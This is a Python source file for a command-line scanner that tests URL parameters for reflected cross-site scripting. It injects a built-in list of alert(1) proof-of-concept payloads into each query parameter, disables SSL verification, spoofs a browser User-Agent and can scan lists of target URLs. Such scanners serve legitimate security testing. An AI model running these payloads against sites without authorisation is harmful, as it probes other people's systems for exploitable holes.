import requests
from urllib.parse import urljoin, urlparse
from typing import List, Dict
import re
import os
import argparse
import json
from datetime import datetime
import sys
import urllib3
import warnings
from colorama import Fore, Style, init

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init()

class XSSScanner:
    def __init__(self, payload_file='payloads.txt'):
        self._print_banner()
        self.payloads = self._load_payloads(payload_file)
    
    def _load_payloads(self, payload_file: str) -> List[str]:
        try:
            file_path = os.path.join(os.path.dirname(__file__), payload_file)
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            print(f"[!] Payload file not found: {payload_file}")
            print("[*] Using default payloads...")
            return [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '"><img src=x onerror=alert(1)>',
                'javascript:alert(1)//',
                '"><svg/onload=alert(1)>'
            ]

    def _print_banner(self):
        banner = """
 ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
 ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
  ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
  ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
 ██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                                    v1.0
                                                              Author: AAYUSH POKHAREL | det0x
        """
        print(banner)
        print(f"{Fore.CYAN}Starting XSS Scanner...{Style.RESET_ALL}\n")

    def _get_status_color(self, status_code: int) -> str:
        if 200 <= status_code < 300:
            return Fore.GREEN
        elif 300 <= status_code < 400:
            return Fore.YELLOW
        elif 400 <= status_code < 500:
            return Fore.RED
        elif 500 <= status_code < 600:
            return Fore.BLUE
        return Fore.WHITE

    def scan_url(self, url: str) -> Dict:
        results = {
            'url': url,
            'vulnerable_params': [],
            'status': 'safe'
        }
        
        try:
            params = self._get_parameters(url)
            
            if not params:
                print(f"\n{Fore.YELLOW}[!] No parameters found to test in URL{Style.RESET_ALL}")
                print(f"{Fore.BLUE}[*] Consider testing for other types of XSS vulnerabilities manually{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.CYAN}[*] Testing {len(params)} parameters for XSS vulnerabilities{Style.RESET_ALL}")
                for param in params:
                    for payload in self.payloads:
                        try:
                            test_url = self._inject_payload(url, param, payload)
                            response = requests.get(
                                test_url,
                                verify=False,
                                timeout=10,
                                headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                                }
                            )
                            
                            if self._check_reflection(response.text, payload, test_url):
                                status_color = self._get_status_color(response.status_code)
                                content_type = response.headers.get('Content-Type', '')
                                
                                print(f"\nTesting payload: [{status_color}{response.status_code}{Style.RESET_ALL}] {payload}")
                                print(f"{Fore.CYAN}[*] Content-Type: {content_type}{Style.RESET_ALL}")
                                print(f"{Fore.GREEN}[+] XSS Found! Working payload reflected in response")
                                print(f"{Fore.GREEN}[+] Vulnerable URL: {test_url}{Style.RESET_ALL}\n")
                                
                                results['vulnerable_params'].append({
                                    'parameter': param,
                                    'payload': payload,
                                    'method': 'GET',
                                    'status_code': response.status_code,
                                    'content_type': content_type,
                                    'vulnerable_url': test_url
                                })
                                results['status'] = 'vulnerable'
                                
                        except requests.exceptions.RequestException:
                            continue
            
            return results
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error scanning {url}: {str(e)}{Style.RESET_ALL}")
            return {'url': url, 'error': str(e), 'status': 'error'}

    def _get_parameters(self, url: str) -> List[str]:
        parsed = urlparse(url)
        if not parsed.query:
            return []
        return [param.split('=')[0] for param in parsed.query.split('&')]

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = dict(pair.split('=') for pair in parsed.query.split('&'))
        params[param] = payload
        new_query = '&'.join(f"{k}={v}" for k, v in params.items())
        return url.replace(parsed.query, new_query)

    def _check_reflection(self, response: str, payload: str, test_url: str) -> bool:
        response_lower = response.lower()
        payload_lower = payload.lower()
        
        if payload_lower not in response_lower:
            return False
            
        injection_patterns = [
            ('<script>', '</script>'),
            ('onerror=', 'alert'),
            ('onload=', 'alert'),
            ('javascript:', 'alert'),
        ]
        
        for start, end in injection_patterns:
            if start.lower() in response_lower and end.lower() in response_lower:
                payload_pos = response_lower.find(payload_lower)
                before_payload = response_lower[max(0, payload_pos-50):payload_pos]
                after_payload = response_lower[payload_pos:payload_pos+50]
                
                if not ('"' in before_payload and '"' in after_payload) and \
                   not ("'" in before_payload and "'" in after_payload):
                    return True
        
        return False

    @staticmethod
    def run():
        parser = argparse.ArgumentParser(description='XSS Vulnerability Scanner')
        parser.add_argument('-t', '--target', help='Single target URL', required=False)
        parser.add_argument('--target-list', help='File containing list of URLs to scan', required=False)
        parser.add_argument('--output', '-o', help='Output file for results (optional)')
        args = parser.parse_args()
        
        if not args.target and not args.target_list:
            print("[!] Error: Either --target or --target-list is required")
            sys.exit(1)
            
        scanner = XSSScanner()
        targets = []
        
        try:
            # Handle target list file
            if args.target_list:
                try:
                    with open(args.target_list, 'r') as f:
                        targets.extend([line.strip() for line in f if line.strip()])
                    print(f"[*] Loaded {len(targets)} targets from {args.target_list}")
                except FileNotFoundError:
                    print(f"[!] Target list file not found: {args.target_list}")
                    sys.exit(1)
                    
            # Handle single target
            if args.target:
                targets.append(args.target)
                
            if not targets:
                print("[!] No valid targets provided")
                sys.exit(1)
                
            print(f"[*] Total targets to scan: {len(targets)}")
            
            all_results = []
            for i, url in enumerate(targets, 1):
                print(f"\n{Fore.CYAN}[*] Scanning target {i}/{len(targets)}: {url}{Style.RESET_ALL}")
                results = scanner.scan_url(url)
                results['timestamp'] = datetime.now().isoformat()
                all_results.append(results)
                
                if results['status'] == 'error':
                    print(f"\n{Fore.RED}[-] Error during scan: {results.get('error')}{Style.RESET_ALL}")
                elif results['status'] == 'safe':
                    print(f"\n{Fore.BLUE}[+] No XSS vulnerabilities found in this target{Style.RESET_ALL}")
            
            if args.output and all_results:
                try:
                    with open(args.output, 'w') as f:
                        json.dump(all_results, f, indent=4)
                    print(f"\n{Fore.GREEN}[+] Results saved to: {args.output}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"\n{Fore.RED}[-] Error saving results: {str(e)}{Style.RESET_ALL}")

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
            if args.output and all_results:
                try:
                    with open(args.output, 'w') as f:
                        json.dump(all_results, f, indent=4)
                    print(f"{Fore.GREEN}[+] Partial results saved to: {args.output}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Error saving partial results: {str(e)}{Style.RESET_ALL}")
            sys.exit(0)

if __name__ == "__main__":
    XSSScanner.run()
